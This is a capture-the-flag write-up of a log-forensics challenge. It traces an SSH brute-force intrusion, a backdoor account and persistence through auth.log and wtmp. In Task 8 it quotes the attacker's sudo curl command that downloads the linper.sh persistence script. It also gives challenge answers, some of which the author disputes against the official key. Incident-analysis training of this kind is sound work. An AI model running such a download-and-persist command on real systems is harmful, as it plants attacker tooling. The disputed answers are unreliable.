# Challenge Context
- **Name**: Brutus
- **Difficulty**: Very Easy
- **Category**: Forensics
- **OS**: Ubuntu 24.04
- **CTF Date**: 04-04-2024
- **Description**:
> In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
# Writeup
## Task 1
### **Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**
<img width="1212" height="680" alt="image" src="https://github.com/user-attachments/assets/4bfdad71-dc9f-4359-9cd4-328fe3040593" />

I filtered down the auth.log to check for unusual amounts of failed password attempts. From my observation, there are multiple failed password attempts coming from IP address 65.2.161.68.
From this, I conclude that the attacker's IP address is 65.2.161.68.

### Final Answer
The final answer to Task 1 is 65.2.161.68.

## Task 2
### **The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?**
<img width="1011" height="173" alt="image" src="https://github.com/user-attachments/assets/a0cff3d2-fb9b-4764-b533-cc029ed8b0e2" />

Now that I know the attacker's IP address is 65.2.161.68, I applied a new filter to the logs to check for successful attempts.
From the screenshot, I can see that the attacker had successfully logged into the **root** user at 06:31:40.

### Final Answer
The final answer to Task 2 is root.

## Task 3
### **Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**
<img width="936" height="309" alt="image" src="https://github.com/user-attachments/assets/a3c80ff2-7748-432d-8004-0fd1bf08bba0" />

I ran the commands `TZ=utc last -f wtmp -F` to set the timezone to UTC, format the date and time, and read the wtmp file.
I observe that the line `root     pts/1        65.2.161.68      Wed Mar  6 06:32:45 2024 - Wed Mar  6 06:37:24 2024  (00:04)` looks to be when the attacker gained access and maintained access to carry out their objective.

### Final Answer
The final answer to Task 3 is 2024-03-06 06:32:45.

## Task 4
### **SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**
<img width="1022" height="273" alt="image" src="https://github.com/user-attachments/assets/76c1fa6f-a2c9-4c65-97c5-5d84c043a6f8" />

I now apply a new filter to auth.log to look for when there was an accepted password and a new session was opened.
From my observation, the attacker first established a connection to the root user in session 34.

### Final Answer
The final answer to Task 4 is 34.
**NOTE:** HTB says that the answer is 37, which I believe is the incorrect answer, as this is the second session and not the first session.

## Task 5
### **The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**
<img width="1219" height="720" alt="image" src="https://github.com/user-attachments/assets/4030ecb1-61e4-41fd-9a65-e275c293c49c" />

I ran the command `cat auth.log` to view the full auth.log to analyze further when the attacker added a new user. I noticed at 06:34:18, a group was added for a user named "cyberjunkie".
Around the same time frame, there were lots of user configurations made for that user. I conclude that the new user the attacker added is cyberjunkie.

### Final Answer
The final answer to Task 5 is cyberjunkie.

## Task 6
### **What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**
<img width="1420" height="1029" alt="image" src="https://github.com/user-attachments/assets/28be630f-c0d6-4a56-a303-fcf397272978" />

<img width="128" height="522" alt="image" src="https://github.com/user-attachments/assets/33e56353-1a45-40b6-9d60-b7d853cbbff2" />

<img width="1237" height="520" alt="image" src="https://github.com/user-attachments/assets/4f23b2f9-2098-4b09-8d6b-7d7ff443b509" />

<img width="1249" height="458" alt="image" src="https://github.com/user-attachments/assets/1c6752d9-0800-450b-8ea2-e9c29814738f" />

To find out the sub-technique ID, I navigated to the MITTRE ATT&CK site, then under the "Persistence" tactics, I went into the "Create Account" technique. From there, I see there are three different sub-techniques: T1136.001, T1136.002, and T1136.003. 

To understand what each sub-technique was, I opened each sub ID and read into its technique, and I determined that sub-technique T1136.001 (local account) was the most appropriate in this situation. T1136.002 was regarding domain accounts, and T1136.003 is about cloud accounts, which were not applicable in this case.

### Final Answer
The final answer to Task 6 is T1136.001.

## Task 7
### **What time did the attacker's first SSH session end according to auth.log?**
<img width="669" height="147" alt="image" src="https://github.com/user-attachments/assets/dab5bedc-2cd5-4ee9-9549-4a49464db56c" />

To find when the attacker's first SSH session ended, I applied a filter `Removed session` to get a list of when each sessions were closed. From my observation, the first SSH session ended on 2024-03-06 06:31:40.

### Final Answer
The final answer to Task 7 is 2024-03-06 06:31:40.
**NOTE:** HTB says that the answer is 2024-03-06 06:37:24, which I believe is the incorrect answer, as this is the second session and not the first session.

## Task 8
### **The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**
<img width="1217" height="269" alt="image" src="https://github.com/user-attachments/assets/af368e45-2450-46ef-b81d-53254d2e0029" />

I filtered down auth.log to show all sudo commands and I observe that at 06:39:38, the attacker ran the `curl` command to download a script.

### Final Answer
The final answer to Task 8 is /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh.
